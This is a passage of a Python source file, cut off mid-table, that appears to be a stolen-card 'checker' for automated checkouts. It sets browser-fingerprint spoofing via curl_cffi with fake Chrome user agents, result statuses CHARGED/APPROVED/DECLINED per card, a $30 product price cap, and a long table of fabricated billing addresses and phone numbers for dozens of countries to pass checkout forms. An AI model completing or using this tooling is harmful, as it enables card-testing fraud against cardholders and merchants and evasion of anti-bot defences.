import asyncio
import html
import json
import random
import re
import time
import urllib.parse
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple

from curl_cffi.requests import AsyncSession

MAX_PRODUCT_PRICE = 30.0
MIN_PRODUCT_PRICE = 0.01
MAX_CHECKOUT_SECONDS = 120.0
POLL_MAX_ATTEMPTS = 60
POLL_MIN_DELAY_MS = 250
POLL_MAX_DELAY_MS = 600
PRODUCT_CACHE_TTL = 600.0
TAX_RETRY_LIMIT = 3

BROWSER_MAP = {
    "chrome136": {
        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
        "sec_ch_ua": '"Chromium";v="136", "Not.A/Brand";v="24"',
        "full_ver": '"Chromium";v="136.0.0.0", "Not.A/Brand";v="24.0.0.0"',
    },
    "chrome133a": {
        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
        "sec_ch_ua": '"Chromium";v="133", "Not(A:Brand";v="24"',
        "full_ver": '"Chromium";v="133.0.0.0", "Not(A:Brand";v="24.0.0.0"',
    },
    "chrome131": {
        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "sec_ch_ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        "full_ver": '"Google Chrome";v="131.0.6778.86", "Chromium";v="131.0.6778.86", "Not_A Brand";v="24.0.0.0"',
    },
    "chrome124": {
        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "sec_ch_ua": '"Google Chrome";v="124", "Chromium";v="124", "Not_A Brand";v="24"',
        "full_ver": '"Google Chrome";v="124.0.6367.91", "Chromium";v="124.0.6367.91", "Not_A Brand";v="24.0.0.0"',
    },
    "chrome120": {
        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "sec_ch_ua": '"Google Chrome";v="120", "Chromium";v="120", "Not_A Brand";v="24"',
        "full_ver": '"Google Chrome";v="120.0.6099.130", "Chromium";v="120.0.6099.130", "Not_A Brand";v="24.0.0.0"',
    },
}
DEFAULT_BROWSER = "chrome131"


class CheckStatus:
    CHARGED = 0
    APPROVED = 1
    DECLINED = 2
    ERROR = 3


@dataclass
class CheckResult:
    card: str
    status: int
    status_code: str = ""
    response: str = ""        # raw gateway response message
    amount: str = ""
    currency: str = ""
    site_name: str = ""
    shop_url: str = ""
    receipt_url: str = ""
    paid_site: str = ""
    gateway: str = ""
    error: Optional[Exception] = None
    retryable: bool = False
    severity: str = "info"
    step: str = ""

    def formatted_amount(self) -> str:
        return format_amount(self.amount, self.currency)


@dataclass
class Address:
    first_name: str
    last_name: str
    address1: str
    address2: str
    city: str
    country_code: str
    zone_code: str
    postal_code: str
    phone: str
    email_domain: str = "gmail.com"


@dataclass
class ErrorInfo:
    code: str = ""
    label: str = ""
    message: str = ""
    severity: str = "info"
    retryable: bool = False
    raw: str = ""
    type: str = ""
    actionable: bool = False

    def best_message(self) -> str:
        """Return the most human-readable response text."""
        if self.message:
            return self.message
        if self.code:
            return self.code
        return ""


ADDRESSES_BY_COUNTRY: Dict[str, List[Address]] = {
    "IN": [
        Address("rahul", "sharma", "Flat 5B, Andheri West", "Lokhandwala Complex", "Mumbai", "IN", "MH", "400053", "+919876543210", "gmail.com"),
        Address("priya", "patel", "House 42, Greater Kailash", "Part 1", "New Delhi", "IN", "DL", "110048", "+919812345678", "gmail.com"),
        Address("arjun", "singh", "No 10, MG Road", "Brigade Road", "Bangalore", "IN", "KA", "560001", "+919845123678", "gmail.com"),
        Address("sneha", "reddy", "Plot 7, Banjara Hills", "Road No 12", "Hyderabad", "IN", "TG", "500034", "+919848765432", "gmail.com"),
    ],
    "US": [
        Address("james", "anderson", "428 W 45th St", "Apt 4B", "New York", "US", "NY", "10036", "+12125550100", "gmail.com"),
        Address("michael", "johnson", "123 Hollywood Blvd", "Suite 100", "Los Angeles", "US", "CA", "90028", "+13235550100", "yahoo.com"),
        Address("robert", "williams", "456 Main St", "", "Houston", "US", "TX", "77002", "+17135550100", "outlook.com"),
        Address("david", "brown", "789 Ocean Dr", "Apt 12", "Miami", "US", "FL", "33139", "+13055550100", "hotmail.com"),
    ],
    "GB": [
        Address("james", "wilson", "10 Downing St", "", "London", "GB", "ENG", "SW1A 2AA", "+442071234567", "gmail.com"),
        Address("oliver", "martinez", "123 Deansgate", "Apt 3B", "Manchester", "GB", "ENG", "M3 4BQ", "+441612345678", "outlook.com"),
        Address("harry", "brown", "88 Bullring", "", "Birmingham", "GB", "ENG", "B5 4BH", "+441213456789", "gmail.com"),
        Address("charlie", "davies", "12 Briggate", "", "Leeds", "GB", "ENG", "LS1 6HD", "+441135678901", "gmail.com"),
    ],
    "CA": [
        Address("john", "smith", "200 Kent St", "", "Ottawa", "CA", "ON", "K1A 0G9", "+16135550100", "gmail.com"),
        Address("william", "davis", "789 Granville St", "Floor 5", "Vancouver", "CA", "BC", "V6Z 1K9", "+16045550100", "gmail.com"),
        Address("liam", "martin", "100 King St W", "Suite 400", "Toronto", "CA", "ON", "M5X 1A9", "+14165550100", "outlook.com"),
        Address("noah", "anderson", "500 Rue Sainte-Catherine", "Apt 3", "Montreal", "CA", "QC", "H3B 1A6", "+15145550100", "gmail.com"),
    ],
    "AU": [
        Address("thomas", "taylor", "1 George St", "", "Sydney", "AU", "NSW", "2000", "+61212345678", "gmail.com"),
        Address("daniel", "anderson", "100 Collins St", "Level 10", "Melbourne", "AU", "VIC", "3000", "+61398765432", "yahoo.com"),
        Address("oliver", "thompson", "200 Queen St", "Apt 5", "Brisbane", "AU", "QLD", "4000", "+61734567890", "gmail.com"),
        Address("noah", "white", "88 St Georges Tce", "Suite 12", "Perth", "AU", "WA", "6000", "+61898765432", "outlook.com"),
    ],
    "DE": [
        Address("lucas", "thomas", "Friedrichstr 100", "", "Berlin", "DE", "BE", "10117", "+493012345678", "gmail.com"),
        Address("felix", "schmidt", "Marienplatz 1", "", "Munich", "DE", "BY", "80331", "+49891234567", "gmail.com"),
        Address("maximilian", "weber", "Zeil 50", "Apt 4", "Frankfurt", "DE", "HE", "60313", "+49691234567", "outlook.com"),
        Address("jonas", "meyer", "Reeperbahn 12", "", "Hamburg", "DE", "HH", "20359", "+49401234567", "yahoo.com"),
    ],
    "FR": [
        Address("hugo", "bernard", "10 Rue de Rivoli", "", "Paris", "FR", "IDF", "75001", "+33112345678", "gmail.com"),
        Address("louis", "petit", "15 Rue de la République", "", "Lyon", "FR", "ARA", "69001", "+33487654321", "outlook.com"),
        Address("gabriel", "durand", "20 Rue Sainte-Catherine", "Apt 3", "Bordeaux", "FR", "NAQ", "33000", "+33556789012", "gmail.com"),
        Address("jules", "leroy", "5 Promenade des Anglais", "", "Nice", "FR", "PAC", "06000", "+33493123456", "yahoo.com"),
    ],
    "IT": [
        Address("marco", "rossi", "Via Roma 1", "", "Rome", "IT", "RM", "00184", "+39061234567", "gmail.com"),
        Address("luca", "bianchi", "Corso Buenos Aires 20", "Apt 5", "Milan", "IT", "MI", "20124", "+39021234567", "outlook.com"),
        Address("matteo", "romano", "Via Toledo 100", "", "Naples", "IT", "NA", "80134", "+39081123456", "gmail.com"),
        Address("alessandro", "colombo", "Piazza San Marco 5", "", "Venice", "IT", "VE", "30124", "+39041123456", "yahoo.com"),
    ],
    "ES": [
        Address("carlos", "garcia", "Calle Mayor 1", "", "Madrid", "ES", "M", "28013", "+34912345678", "gmail.com"),
        Address("javier", "martinez", "Passeig de Gràcia 40", "Apt 3", "Barcelona", "ES", "CT", "08007", "+34932123456", "outlook.com"),
        Address("pablo", "lopez", "Calle Larios 10", "", "Malaga", "ES", "AN", "29015", "+34952123456", "gmail.com"),
        Address("sergio", "gonzalez", "Avenida de la Constitución 20", "Suite 5", "Seville", "ES", "AN", "41004", "+34954123456", "yahoo.com"),
    ],
    "NL": [
        Address("bas", "jansen", "Dam 1", "", "Amsterdam", "NL", "NH", "1012 JS", "+31201234567", "gmail.com"),
        Address("daan", "de vries", "Coolsingel 40", "Apt 5", "Rotterdam", "NL", "ZH", "3011 AD", "+31101234567", "outlook.com"),
        Address("sem", "van den berg", "Vredenburg 20", "", "Utrecht", "NL", "UT", "3511 BB", "+31301234567", "gmail.com"),
        Address("lucas", "bakker", "Grote Markt 8", "Suite 2", "The Hague", "NL", "ZH", "2511 BL", "+31701234567", "yahoo.com"),
    ],
    "BE": [
        Address("jan", "peeters", "Grote Markt 1", "", "Brussels", "BE", "BRU", "1000", "+3221234567", "gmail.com"),
        Address("tom", "jansen", "Meir 50", "Apt 3", "Antwerp", "BE", "VAN", "2000", "+3231234567", "outlook.com"),
        Address("bram", "de smet", "Korenmarkt 20", "", "Ghent", "BE", "OVL", "9000", "+3291234567", "gmail.com"),
        Address("wout", "willems", "Rue Saint-Léonard 30", "Suite 2", "Liège", "BE", "WLG", "4000", "+3241234567", "yahoo.com"),
    ],
    "CH": [
        Address("hans", "weber", "Bahnhofstrasse 1", "", "Zurich", "CH", "ZH", "8001", "+41441234567", "gmail.com"),
        Address("peter", "muller", "Rue du Rhône 40", "Apt 3", "Geneva", "CH", "GE", "1204", "+41221234567", "outlook.com"),
        Address("markus", "schmid", "Freie Strasse 20", "", "Basel", "CH", "BS", "4001", "+41611234567", "gmail.com"),
        Address("stefan", "frei", "Spitalgasse 30", "Suite 2", "Bern", "CH", "BE", "3011", "+41311234567", "yahoo.com"),
    ],
    "AT": [
        Address("markus", "gruber", "Stephansplatz 1", "", "Vienna", "AT", "9", "1010", "+4312345678", "gmail.com"),
        Address("thomas", "huber", "Getreidegasse 20", "Apt 3", "Salzburg", "AT", "5", "5020", "+436621234567", "outlook.com"),
        Address("michael", "bauer", "Maria-Theresien-Strasse 30", "", "Innsbruck", "AT", "7", "6020", "+435121234567", "gmail.com"),
        Address("stefan", "wagner", "Herrengasse 15", "Suite 2", "Graz", "AT", "6", "8010", "+433161234567", "yahoo.com"),
    ],
    "SE": [
        Address("erik", "andersson", "Vasagatan 1", "", "Stockholm", "SE", "AB", "111 20", "+468123456", "gmail.com"),
        Address("lars", "johansson", "Avenyn 20", "Apt 4", "Gothenburg", "SE", "VG", "411 36", "+4631123456", "outlook.com"),
        Address("anders", "karlsson", "Stortorget 5", "", "Malmo", "SE", "SN", "211 34", "+4640123456", "gmail.com"),
        Address("johan", "nilsson", "Drottninggatan 30", "Suite 2", "Uppsala", "SE", "UP", "753 20", "+4618123456", "yahoo.com"),
    ],
    "NO": [
        Address("olav", "hansen", "Karl Johans gate 1", "", "Oslo", "NO", "03", "0154", "+4721234567", "gmail.com"),
        Address("erik", "johansen", "Torgallmenningen 20", "Apt 3", "Bergen", "NO", "46", "5014", "+4755123456", "outlook.com"),
        Address("lars", "olsen", "Nordre gate 30", "", "Trondheim", "NO", "50", "7011", "+4773123456", "gmail.com"),
        Address("magnus", "larsen", "Kirkegata 15", "Suite 2", "Stavanger", "NO", "11", "4006", "+4751123456", "yahoo.com"),
    ],
    "DK": [
        Address("lars", "nielsen", "Strøget 1", "", "Copenhagen", "DK", "84", "1457", "+4531234567", "gmail.com"),
        Address("mikkel", "jensen", "Store Torv 20", "Apt 3", "Aarhus", "DK", "82", "8000", "+4586123456", "outlook.com"),
        Address("rasmus", "hansen", "Kongensgade 30", "", "Odense", "DK", "83", "5000", "+4566123456", "gmail.com"),
        Address("anders", "larsen", "Boulevarden 15", "Suite 2", "Aalborg", "DK", "81", "9000", "+4596123456", "yahoo.com"),
    ],
    "FI": [
        Address("jussi", "korhonen", "Mannerheimintie 1", "", "Helsinki", "FI", "18", "00100", "+35891234567", "gmail.com"),
        Address("mikko", "virtanen", "Hämeenkatu 20", "Apt 3", "Tampere", "FI", "11", "33100", "+35831234567", "outlook.com"),
        Address("antti", "makinen", "Yliopistonkatu 30", "", "Turku", "FI", "19", "20100", "+35821234567", "gmail.com"),
        Address("matias", "nurmi", "Kirkkokatu 15", "Suite 2", "Oulu", "FI", "17", "90100", "+35881234567", "yahoo.com"),
    ],
    "IE": [
        Address("sean", "murphy", "1 Grafton St", "", "Dublin", "IE", "D", "D02 Y006", "+35311234567", "gmail.com"),
        Address("conor", "kelly", "20 Patrick St", "Apt 3", "Cork", "IE", "CO", "T12 XY45", "+35321234567", "outlook.com"),
        Address("liam", "byrne", "15 Shop St", "", "Galway", "IE", "G", "H91 XY12", "+35391234567", "gmail.com"),
        Address("cathal", "oconnor", "O'Connell St 30", "Suite 2", "Limerick", "IE", "LK", "V94 XY12", "+35361234567", "yahoo.com"),
    ],
    "PT": [
        Address("joao", "silva", "Rua Augusta 1", "", "Lisbon", "PT", "LIS", "1100-053", "+351211234567", "gmail.com"),
        Address("diogo", "santos", "Rua de Santa Catarina 20", "Apt 3", "Porto", "PT", "POR", "4000-447", "+351221234567", "outlook.com"),
        Address("tiago", "ferreira", "Avenida da Liberdade 50", "", "Braga", "PT", "BRA", "4700-325", "+351253123456", "gmail.com"),
        Address("ricardo", "pereira", "Rua do Ouro 30", "Suite 2", "Coimbra", "PT", "COI", "3000-060", "+351239123456", "yahoo.com"),
    ],
    "PL": [
        Address("piotr", "kowalski", "Nowy Swiat 1", "", "Warsaw", "PL", "MZ", "00-001", "+48221234567", "gmail.com"),
        Address("tomasz", "nowak", "Florianska 20", "Apt 5", "Krakow", "PL", "MA", "31-021", "+48121234567", "outlook.com"),
        Address("marcin", "wisniewski", "Piotrkowska 100", "", "Lodz", "PL", "LD", "90-001", "+48421234567", "gmail.com"),
        Address("krzysztof", "wojcik", "Swietego Marcin 30", "Suite 2", "Poznan", "PL", "WP", "61-001", "+48611234567", "yahoo.com"),
    ],
    "CZ": [
        Address("jan", "novak", "Vaclavske namesti 1", "", "Prague", "CZ", "PR", "110 00", "+420212345678", "gmail.com"),
        Address("petr", "svoboda", "Namesti Svobody 20", "Apt 3", "Brno", "CZ", "JM", "602 00", "+420512345678", "outlook.com"),
        Address("jakub", "dvorak", "Hlavni trida 30", "", "Ostrava", "CZ", "MO", "702 00", "+420612345678", "gmail.com"),
        Address("tomas", "cerny", "Palackeho 15", "Suite 2", "Olomouc", "CZ", "OL", "779 00", "+420512345679", "yahoo.com"),
    ],
    "GR": [
        Address("nikos", "papadopoulos", "Ermou 1", "", "Athens", "GR", "I", "10563", "+302101234567", "gmail.com"),
        Address("giorgos", "georgiou", "Tsimiski 20", "Apt 3", "Thessaloniki", "GR", "B", "54624", "+302310123456", "outlook.com"),
        Address("dimitris", "dimitriou", "Maizonos 30", "", "Patras", "GR", "G", "26221", "+302610123456", "gmail.com"),
        Address("kostas", "konstantinou", "25 Martiou 15", "Suite 2", "Heraklion", "GR", "M", "71201", "+302810123456", "yahoo.com"),
    ],
    "TR": [
        Address("mehmet", "yilmaz", "Istiklal Caddesi 1", "Apt 3", "Istanbul", "TR", "34", "34000", "+902121234567", "gmail.com"),
        Address("mustafa", "demir", "Kizilay 20", "", "Ankara", "TR", "06", "06000", "+903121234567", "outlook.com"),
        Address("ahmet", "kaya", "Alsancak 40", "Suite 5", "Izmir", "TR", "35", "35000", "+902321234567", "gmail.com"),
        Address("ali", "celik", "Ataturk Bulvari 30", "", "Bursa", "TR", "16", "16000", "+902241234567", "yahoo.com"),
    ],
    "IL": [
        Address("david", "cohen", "Rothschild Blvd 1", "Apt 5", "Tel Aviv", "IL", "TA", "6688101", "+97231234567", "gmail.com"),
        Address("moshe", "levi", "Jaffa Road 20", "", "Jerusalem", "IL", "JM", "9434107", "+97221234567", "outlook.com"),
        Address("yossi", "mizrahi", "HaNassi Blvd 40", "Suite 3", "Haifa", "IL", "HA", "3319101", "+97241234567", "gmail.com"),
        Address("ariel", "peretz", "Dizengoff 30", "", "Tel Aviv", "IL", "TA", "6433212", "+97231234568", "yahoo.com"),
    ],
    "AE": [
        Address("ahmed", "al-mansouri", "Sheikh Zayed Road 1", "", "Dubai", "AE", "DU", "12345", "+97141234567", "gmail.com"),
        Address("khalid", "al-suwaidi", "Corniche Road 20", "Apt 5", "Abu Dhabi", "AE", "AZ", "54321", "+97121234567", "outlook.com"),
        Address("omar", "al-farsi", "Al Majaz 3", "", "Sharjah", "AE", "SH", "23456", "+97161234567", "gmail.com"),
        Address("saif", "al-mazrouei", "Al Ittihad Road 30", "Suite 2", "Ajman", "AE", "AJ", "34567", "+97161234568", "yahoo.com"),
    ],
    "SA": [
        Address("mohammed", "al-ahmed", "King Fahd Road 1", "", "Riyadh", "SA", "01", "11564", "+966112345678", "gmail.com"),
        Address("abdullah", "al-harbi", "Corniche Road 50", "Apt 3", "Jeddah", "SA", "02", "21589", "+966122345678", "outlook.com"),
        Address("faisal", "al-qahtani", "King Abdullah St 20", "", "Dammam", "SA", "04", "31411", "+966132345678", "gmail.com"),
        Address("sultan", "al-otaibi", "Prince Sultan Rd 30", "Suite 5", "Mecca", "SA", "02", "24231", "+966122345679", "yahoo.com"),
    ],
    "EG": [
        Address("ahmed", "hassan", "1 Tahrir Square", "Downtown", "Cairo", "EG", "C", "11511", "+20212345678", "gmail.com"),
        Address("mohamed", "ali", "20 Corniche Road", "Raml Station", "Alexandria", "EG", "ALX", "21511", "+20312345678", "outlook.com"),
        Address("mahmoud", "ibrahim", "30 Nile Street", "Zamalek", "Cairo", "EG", "C", "11211", "+20212345679", "gmail.com"),
        Address("mostafa", "sayed", "15 Pyramids Road", "Haram", "Giza", "EG", "GZ", "12556", "+20212345680", "yahoo.com"),
    ],
    "MA": [
        Address("youssef", "el amrani", "1 Avenue Mohammed V", "Guéliz", "Marrakech", "MA", "MRK", "40000", "+212524123456", "gmail.com"),
        Address("karim", "benali", "20 Boulevard Hassan II", "Centre Ville", "Casablanca", "MA", "CAS", "20000", "+212522123456", "outlook.com"),
        Address("omar", "alaoui", "30 Avenue Mohammed V", "Agdal", "Rabat", "MA", "RAB", "10000", "+212537123456", "gmail.com"),
        Address("hamza", "tazi", "15 Rue de la Liberté", "Fes El Bali", "Fes", "MA", "FES", "30000", "+212535123456", "yahoo.com"),
    ],
    "NG": [
        Address("adebayo", "ogundimu", "1 Broad Street", "Lagos Island", "Lagos", "NG", "LA", "100001", "+234112345678", "gmail.com"),
        Address("chinedu", "okafor", "20 Ahmadu Bello Way", "Victoria Island", "Lagos", "NG", "LA", "101241", "+234112345679", "outlook.com"),
        Address("emeka", "nwosu", "30 Aba Road", "Port Harcourt", "Rivers", "NG", "RI", "500001", "+234812345678", "gmail.com"),
        Address("tunde", "adeyemi", "15 Oba Akran Avenue", "Ikeja", "Lagos", "NG", "LA", "100212", "+234812345679", "yahoo.com"),
    ],
    "KE": [
        Address("james", "mwangi", "1 Kenyatta Avenue", "Nairobi Central", "Nairobi", "KE", "NAI", "00100", "+254201234567", "gmail.com"),
        Address("peter", "odhiambo", "20 Moi Avenue", "Mombasa Island", "Mombasa", "KE", "MSA", "80100", "+254411234567", "outlook.com"),
        Address("david", "kamau", "30 Tom Mboya Street", "Nairobi Central", "Nairobi", "KE", "NAI", "00200", "+254201234568", "gmail.com"),
        Address("grace", "wambui", "15 Oginga Odinga Street", "Kisumu", "Kisumu", "KE", "KIS", "40100", "+254571234567", "yahoo.com"),
    ],
    "ZA": [
        Address("johan", "van der merwe", "1 Sandton Drive", "Sandton", "Johannesburg", "ZA", "GP", "2196", "+27111234567", "gmail.com"),
        Address("pieter", "botha", "20 Long Street", "City Bowl", "Cape Town", "ZA", "WC", "8001", "+27211234567", "outlook.com"),
        Address("thabo", "mokoena", "30 Florida Road", "Morningside", "Durban", "ZA", "KZN", "4001", "+27311234567", "gmail.com"),
        Address("sipho", "nkosi", "15 Church Street", "Pretoria Central", "Pretoria", "ZA", "GP", "0002", "+27121234567", "yahoo.com"),
    ],
    "BR": [
        Address("joao", "santos", "Av. Paulista 1000", "Apt 1201", "Sao Paulo", "BR", "SP", "01310-100", "+551112345678", "gmail.com"),
        Address("pedro", "silva", "Av. Atlantica 1500", "Apt 302", "Rio de Janeiro", "BR", "RJ", "22021-001", "+552112345678", "yahoo.com"),
        Address("lucas", "oliveira", "Av. Afonso Pena 2000", "", "Belo Horizonte", "BR", "MG", "30130-009", "+553112345678", "gmail.com"),
        Address("mateus", "souza", "Av. Sete de Setembro 500", "Suite 10", "Curitiba", "BR", "PR", "80060-000", "+554112345678", "outlook.com"),
    ],
    "MX": [
        Address("carlos", "lopez", "Av. Reforma 100", "", "Mexico City", "MX", "CMX", "06000", "+525512345678", "gmail.com"),
        Address("jose", "hernandez", "Av. Chapultepec 500", "Apt 5", "Guadalajara", "MX", "JAL", "44100", "+523312345678", "outlook.com"),
        Address("miguel", "garcia", "Av. Constitución 300", "", "Monterrey", "MX", "NL", "64000", "+528112345678", "gmail.com"),
        Address("fernando", "martinez", "Calle 60 No 400", "Suite 3", "Merida", "MX", "YUC", "97000", "+529991234567", "yahoo.com"),
    ],
    "AR": [
        Address("juan", "garcia", "Av. Corrientes 1000", "Apt 5", "Buenos Aires", "AR", "C", "C1043", "+541112345678", "gmail.com"),
        Address("matias", "rodriguez", "Av. Cordoba 500", "", "Cordoba", "AR", "X", "X5000", "+543512345678", "outlook.com"),
        Address("lucas", "fernandez", "Av. Pellegrini 300", "Suite 2", "Rosario", "AR", "S", "S2000", "+543412345678", "gmail.com"),
        Address("nicolas", "lopez", "Calle Florida 200", "", "Mendoza", "AR", "M", "M5500", "+542612345678", "yahoo.com"),
    ],
    "CL": [
        Address("pedro", "gonzalez", "Av. Providencia 1000", "Apt 5", "Santiago", "CL", "RM", "7500000", "+562212345678", "gmail.com"),
        Address("matias", "rojas", "Av. Alemania 500", "", "Valparaiso", "CL", "VS", "2340000", "+563212345678", "outlook.com"),
        Address("cristobal", "muñoz", "Av. O'Higgins 300", "Suite 2", "Concepcion", "CL", "BI", "4030000", "+564112345678", "gmail.com"),
        Address("ignacio", "castro", "Av. Brasil 200", "", "Antofagasta", "CL", "AN", "1240000", "+565512345678", "yahoo.com"),
    ],
    "CO": [
        Address("andres", "rodriguez", "Carrera 7 # 100", "", "Bogota", "CO", "DC", "110111", "+5711234567", "gmail.com"),
        Address("juan", "gomez", "Carrera 43 # 50", "Apt 3", "Medellin", "CO", "ANT", "050001", "+5741234567", "outlook.com"),
        Address("carlos", "martinez", "Calle 5 # 30", "", "Cali", "CO", "VAC", "760001", "+5721234567", "gmail.com"),
        Address("felipe", "lopez", "Carrera 53 # 80", "Suite 5", "Barranquilla", "CO", "ATL", "080001", "+5751234567", "yahoo.com"),
    ],
    "PE": [
        Address("juan", "garcia", "Av. Larco 1000", "Apt 5", "Lima", "PE", "LIM", "15074", "+5111234567", "gmail.com"),
        Address("carlos", "rodriguez", "Calle Mercaderes 500", "", "Arequipa", "PE", "ARE", "04001", "+5154123456", "outlook.com"),
        Address("diego", "flores", "Av. El Sol 300", "Suite 2", "Cusco", "PE", "CUS", "08001", "+5184123456", "gmail.com"),
        Address("miguel", "vargas", "Av. Grau 200", "", "Trujillo", "PE", "LAL", "13001", "+5144123456", "yahoo.com"),
    ],
    "JP": [
        Address("takashi", "yamamoto", "1-1-1 Marunouchi", "Chiyoda-ku", "Tokyo", "JP", "13", "100-0005", "+81312345678", "gmail.com"),
        Address("hiroshi", "tanaka", "2-2-2 Umeda", "Kita-ku", "Osaka", "JP", "27", "530-0001", "+81612345678", "outlook.com"),
        Address("yuki", "sato", "3-3-3 Sakae", "Naka-ku", "Nagoya", "JP", "23", "460-0008", "+81521234567", "gmail.com"),
        Address("kenji", "suzuki", "4-4-4 Hakata", "Hakata-ku", "Fukuoka", "JP", "40", "812-0011", "+81921234567", "yahoo.com"),
    ],
    "KR": [
        Address("min-jun", "kim", "1 Gangnam-daero", "Gangnam-gu", "Seoul", "KR", "11", "06236", "+82212345678", "gmail.com"),
        Address("seo-jun", "lee", "20 Haeundae-ro", "Haeundae-gu", "Busan", "KR", "26", "48095", "+825112345678", "outlook.com"),
        Address("ji-ho", "park", "30 Dongseong-ro", "Jung-gu", "Daegu", "KR", "27", "41911", "+825312345678", "gmail.com"),
        Address("do-yun", "choi", "40 Bupyeong-daero", "Bupyeong-gu", "Incheon", "KR", "28", "21384", "+823212345678", "yahoo.com"),
    ],
    "HK": [
        Address("wei", "chen", "1 Queen's Road Central", "", "Hong Kong", "HK", "HCW", "000000", "+85212345678", "gmail.com"),
        Address("ming", "wong", "20 Nathan Road", "Tsim Sha Tsui", "Kowloon", "HK", "KKC", "000000", "+85212345679", "outlook.com"),
        Address("wing", "lee", "30 Hennessy Road", "Wan Chai", "Hong Kong", "HK", "HWC", "000000", "+85212345680", "gmail.com"),
        Address("ka", "chan", "15 Sha Tsui Road", "Tsuen Wan", "New Territories", "HK", "NTW", "000000", "+85212345681", "yahoo.com"),
    ],
    "TW": [
        Address("wei", "chen", "1 Xinyi Road", "Xinyi District", "Taipei", "TW", "TPE", "110", "+886212345678", "gmail.com"),
        Address("ming", "lin", "20 Zhongshan Road", "Zhongzheng District", "Taipei", "TW", "TPE", "100", "+886212345679", "outlook.com"),
        Address("jun", "huang", "30 Taiwan Boulevard", "Xitun District", "Taichung", "TW", "TXG", "407", "+886412345678", "gmail.com"),
        Address("hao", "wu", "15 Zhongzheng Road", "Lingya District", "Kaohsiung", "TW", "KHH", "802", "+886712345678", "yahoo.com"),
    ],
    "SG": [
        Address("wei", "tan", "1 Raffles Place", "#01-01", "Singapore", "SG", "01", "048616", "+6561234567", "gmail.com"),
        Address("ming", "lim", "10 Orchard Road", "#05-10", "Singapore", "SG", "09", "238840", "+6562345678", "outlook.com"),
        Address("jun", "lee", "50 Marina Bay", "#20-05", "Singapore", "SG", "01", "018982", "+6563456789", "gmail.com"),
        Address("hao", "ng", "5 Serangoon Road", "#02-15", "Singapore", "SG", "20", "217561", "+6564567890", "yahoo.com"),
    ],
    "MY": [
        Address("ahmad", "bin ismail", "1 Jalan Bukit Bintang", "Bukit Bintang", "Kuala Lumpur", "MY", "14", "55100", "+60312345678", "gmail.com"),
        Address("muhammad", "abdullah", "20 Jalan Ampang", "KLCC", "Kuala Lumpur", "MY", "14", "50450", "+60312345679", "outlook.com"),
        Address("lee", "chong wei", "30 Lebuh Chulia", "George Town", "Penang", "MY", "07", "10200", "+6041234567", "gmail.com"),
        Address("tan", "ah kow", "15 Jalan Wong Ah Fook", "City Center", "Johor Bahru", "MY", "01", "80000", "+6071234567", "yahoo.com"),
    ],
    "TH": [
        Address("somchai", "wong", "1 Sukhumvit Road", "Watthana", "Bangkok", "TH", "10", "10110", "+6621234567", "gmail.com"),
        Address("somsak", "chai", "20 Silom Road", "Bang Rak", "Bangkok", "TH", "10", "10500", "+6621234568", "outlook.com"),
        Address("niran", "prathet", "30 Nimmanhaemin Road", "Suthep", "Chiang Mai", "TH", "50", "50200", "+66531234567", "gmail.com"),
        Address("chai", "sukhum", "15 Beach Road", "Bang Lamung", "Pattaya", "TH", "20", "20150", "+66381234567", "yahoo.com"),
    ],
    "PH": [
        Address("juan", "dela cruz", "1 Ayala Avenue", "Makati", "Manila", "PH", "00", "1226", "+6321234567", "gmail.com"),
        Address("jose", "santos", "20 Ortigas Center", "Pasig", "Manila", "PH", "00", "1605", "+6321234568", "outlook.com"),
        Address("pedro", "reyes", "30 Bonifacio Global City", "Taguig", "Manila", "PH", "00", "1634", "+6321234569", "gmail.com"),
        Address("antonio", "garcia", "15 Osmeña Blvd", "Cebu City", "Cebu", "PH", "07", "6000", "+63321234567", "yahoo.com"),
    ],
    "ID": [
        Address("budi", "santoso", "1 Jalan Thamrin", "Menteng", "Jakarta", "ID", "JK", "10350", "+622112345678", "gmail.com"),
        Address("agus", "wijaya", "20 Jalan Sudirman", "Setiabudi", "Jakarta", "ID", "JK", "12910", "+622112345679", "outlook.com"),
        Address("bambang", "hartono", "30 Jalan Asia Afrika", "Bandung Wetan", "Bandung", "ID", "JB", "40111", "+622212345678", "gmail.com"),
        Address("hendra", "susanto", "15 Jalan Tunjungan", "Genteng", "Surabaya", "ID", "JI", "60275", "+623112345678", "yahoo.com"),
    ],
    "VN": [
        Address("nguyen", "van a", "1 Dong Khoi Street", "District 1", "Ho Chi Minh City", "VN", "SG", "700000", "+842812345678", "gmail.com"),
        Address("tran", "van b", "20 Hang Bai Street", "Hoan Kiem", "Hanoi", "VN", "HN", "100000", "+842412345678", "outlook.com"),
        Address("le", "van c", "30 Nguyen Hue Street", "Hai Chau", "Da Nang", "VN", "DN", "550000", "+842361234567", "gmail.com"),
        Address("pham", "van d", "15 Tran Phu Street", "Nha Trang", "Khanh Hoa", "VN", "KH", "650000", "+842581234567", "yahoo.com"),
    ],
    "PK": [
        Address("muhammad", "khan", "1 Jinnah Avenue", "Blue Area", "Islamabad", "PK", "IS", "44000", "+92511234567", "gmail.com"),
        Address("ahmed", "ali", "20 Mall Road", "Gulberg", "Lahore", "PK", "PB", "54000", "+92421234567", "outlook.com"),
        Address("hassan", "raza", "30 Shahrah-e-Faisal", "Saddar", "Karachi", "PK", "SD", "74400", "+92211234567", "gmail.com"),
        Address("usman", "iqbal", "15 University Road", "Peshawar", "PK", "KP", "25000", "+92911234567", "yahoo.com"),
    ],
    "BD": [
        Address("abdul", "rahman", "1 Gulshan Avenue", "Gulshan", "Dhaka", "BD", "DH", "1212", "+880212345678", "gmail.com"),
        Address("mohammad", "hossain", "20 Agrabad", "Chittagong", "Chittagong", "BD", "CG", "4100", "+880312345678", "outlook.com"),
